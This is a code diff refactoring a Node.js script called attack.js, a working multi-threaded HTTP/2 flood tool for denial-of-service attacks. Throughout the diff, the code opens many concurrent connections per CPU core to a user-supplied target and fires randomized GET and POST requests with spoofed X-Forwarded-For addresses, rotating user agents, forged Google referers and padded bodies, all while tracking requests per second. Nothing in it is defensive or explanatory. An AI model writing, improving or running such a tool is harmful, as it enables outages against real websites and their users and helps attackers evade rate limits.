@@ -1,13 +1,13 @@
 const http2 = require('http2');
-const net = require('net');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
+const net = require('net');
 const os = require('os');
 
 const THREADS = os.cpus().length;
-const CONNECTIONS_PER_THREAD = 100;
-const MAX_INFLIGHT = 2000;
-const LIVE_REFRESH_RATE = 3000;
+const CONNECTIONS = 50;
+const MAX_INFLIGHT = 1000;
+const REFRESH_RATE = 3000;
 
 let totalRequests = 0;
 let successCount = 0;
@@ -16,81 +16,48 @@ let maxRps = 0;
 let rpsLastSecond = 0;
 let end;
 
-function heavyHeaders(path) {
-    return {
-        ':method': Math.random() > 0.5 ? 'POST' : 'GET',
-        ':path': '/' + path,
-        'x-forwarded-for': `${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}.${~~(Math.random()*255)}`,
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'no-cache',
-        'referer': 'https://google.com/search?q=' + Math.random().toString(36).substring(2),
-        'origin': 'https://google.com',
-        'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${randInt(70,120)}) Gecko/20100101 Firefox/${randInt(80,120)}`
-    };
-}
-
-function generatePayload() {
-    return JSON.stringify({
-        session: Math.random().toString(36).substring(2),
-        data: "X".repeat(randInt(1024, 4096))
-    });
-}
-
 function randInt(min, max) {
-    return Math.floor(Math.random() * (max - min)) + min;
+    return Math.floor(Math.random() * (max - min) + min);
 }
-
 function randomPath() {
-    const parts = ['api', 'login', 'submit', 'checkout', 'report'];
-    return parts[Math.floor(Math.random() * parts.length)] + `?id=${Math.random().toString(36).substring(2)}`;
+    return `/api/${Math.random().toString(36).substring(7)}?t=${Date.now()}`;
+}
+function randomIP() {
+    return `${randInt(1, 255)}.${randInt(1, 255)}.${randInt(1, 255)}.${randInt(1, 255)}`;
+}
+function randomUA() {
+    return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/${randInt(500, 600)}.36 (KHTML, like Gecko) Chrome/${randInt(80, 120)}.0.${randInt(1000, 4000)}.100 Safari/${randInt(500, 600)}.36`;
+}
+function generatePayload() {
+    return 'x='.repeat(randInt(1000, 3000));
 }
 
 if (isMainThread) {
-    if (process.argv.length < 3) {
+    const [, , targetArg, durationArg] = process.argv;
+
+    if (!targetArg || !durationArg) {
         console.error('Usage: node attack.js <https://target> <duration_secs>');
         process.exit(1);
     }
 
-    const target = process.argv[2];
-    const duration = parseInt(process.argv[3] || '60');
-    end = Date.now() + duration * 1000;
+    const target = new URL(targetArg);
+    end = Date.now() + parseInt(durationArg) * 1000;
 
     console.clear();
-    console.log(`🚀 HTTP/2 FLOOD STARTED | Threads: ${THREADS}`);
+    console.log(`🚀 Starting HTTP/2 Flood: ${target.hostname}`);
 
     for (let i = 0; i < THREADS; i++) {
         new Worker(__filename, {
             workerData: {
-                target,
-                duration,
-                connections: CONNECTIONS_PER_THREAD
+                target: targetArg,
+                host: target.hostname,
+                duration: parseInt(durationArg),
+                connections: CONNECTIONS
             }
         });
     }
 
-    setInterval(() => {
-        maxRps = Math.max(maxRps, rpsLastSecond);
-        renderStats();
-        rpsLastSecond = 0;
-    }, LIVE_REFRESH_RATE);
-
-    function renderStats() {
-        readline.cursorTo(process.stdout, 0, 0);
-        readline.clearScreenDown(process.stdout);
-
-        const timeLeft = Math.max(0, (end - Date.now()) / 1000);
-        const min = Math.floor(timeLeft / 60);
-        const sec = Math.floor(timeLeft % 60);
-
-        console.log(`🚀 HTTP/2 FLOOD`);
-        console.log(`==============================`);
-        console.log(`Total Requests : ${totalRequests}`);
-        console.log(`Max RPS        : ${maxRps}`);
-        console.log(`Success        : ${successCount}`);
-        console.log(`Errors         : ${errorCount}`);
-        console.log(`Time Remaining : ${min}:${sec < 10 ? '0' : ''}${sec}`);
-    }
-
+    // Metrics Socket
     const server = net.createServer(socket => {
         socket.on('data', data => {
             const msg = data.toString();
@@ -101,76 +68,109 @@ if (isMainThread) {
     });
     server.listen(9999);
 
+    // Stats
+    setInterval(() => {
+        maxRps = Math.max(maxRps, rpsLastSecond);
+        rpsLastSecond = 0;
+        printStats();
+    }, REFRESH_RATE);
+
+    function printStats() {
+        readline.cursorTo(process.stdout, 0, 0);
+        readline.clearScreenDown(process.stdout);
+        const timeLeft = Math.max(0, (end - Date.now()) / 1000);
+        const min = Math.floor(timeLeft / 60);
+        const sec = Math.floor(timeLeft % 60);
+        console.log(`🚀 HTTP/2 FLOOD [${THREADS} threads]`);
+        console.log(`==============================`);
+        console.log(`Total Requests : ${totalRequests}`);
+        console.log(`Max RPS        : ${maxRps}`);
+        console.log(`Success        : ${successCount}`);
+        console.log(`Errors         : ${errorCount}`);
+        console.log(`Time Remaining : ${min}:${sec < 10 ? '0' : ''}${sec}`);
+    }
 } else {
-    const { target, duration, connections } = workerData;
-    const endTime = Date.now() + duration * 1000;
+    const { target, host, duration, connections } = workerData;
     const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
+    const endTime = Date.now() + duration * 1000;
 
-    const url = new URL(target);
-    const inflight = { count: 0 };
+    function flood(client) {
+        const inflight = { count: 0 };
 
-    function sendLoop(client) {
-        if (Date.now() > endTime || inflight.count >= MAX_INFLIGHT) return;
+        function sendOnce() {
+            if (Date.now() > endTime || inflight.count >= MAX_INFLIGHT || client.destroyed) return;
 
-        try {
             inflight.count++;
+            const isPost = Math.random() > 0.5;
             const path = randomPath();
-            const headers = heavyHeaders(path);
-            const isPost = headers[':method'] === 'POST';
+            const headers = {
+                ':method': isPost ? 'POST' : 'GET',
+                ':scheme': 'https',
+                ':authority': host,
+                ':path': path,
+                'user-agent': randomUA(),
+                'x-forwarded-for': randomIP(),
+                'accept': '*/*',
+                'referer': 'https://google.com',
+                'origin': 'https://google.com',
+                'content-type': 'application/x-www-form-urlencoded'
+            };
 
-            const req = client.request(headers);
+            try {
+                const req = client.request(headers);
 
-            req.on('response', () => {
-                inflight.count--;
-                sendStat('ok');
-            });
+                req.setTimeout(5000);
+                req.on('response', () => {
+                    inflight.count--;
+                    sendStat('ok');
+                    req.close();
+                });
+                req.on('error', () => {
+                    inflight.count--;
+                    sendStat('err');
+                });
 
-            req.on('error', () => {
+                if (isPost) {
+                    req.write(generatePayload());
+                }
+                req.end();
+                sendStat('req');
+            } catch (err) {
                 inflight.count--;
                 sendStat('err');
-            });
-
-            if (isPost) {
-                req.write(generatePayload());
             }
 
-            req.end();
-            sendStat('req');
-
-        } catch {
-            inflight.count--;
-            sendStat('err');
+            setImmediate(sendOnce);
         }
 
-        setImmediate(() => sendLoop(client));
+        for (let i = 0; i < connections; i++) {
+            sendOnce();
+        }
     }
 
-    function createConnection() {
+    function startConnection() {
         if (Date.now() > endTime) return;
 
         try {
-            const client = http2.connect(target);
-
-            client.on('connect', () => {
-                for (let i = 0; i < connections; i++) {
-                    sendLoop(client);
-                }
+            const client = http2.connect(target, {
+                settings: { enablePush: false }
             });
 
+            client.on('connect', () => flood(client));
             client.on('error', () => {
                 client.destroy();
-                setTimeout(createConnection, 1000);
+                setTimeout(startConnection, 1000);
             });
-
-            client.on('goaway', () => client.close());
-            client.on('close', () => setTimeout(createConnection, 1000));
+            client.on('close', () => {
+                setTimeout(startConnection, 1000);
+            });
         } catch {
-            setTimeout(createConnection, 1000);
+            setTimeout(startConnection, 1000);
         }
     }
 
     for (let i = 0; i < connections; i++) {
-        createConnection();
+        startConnection();
     }
 }
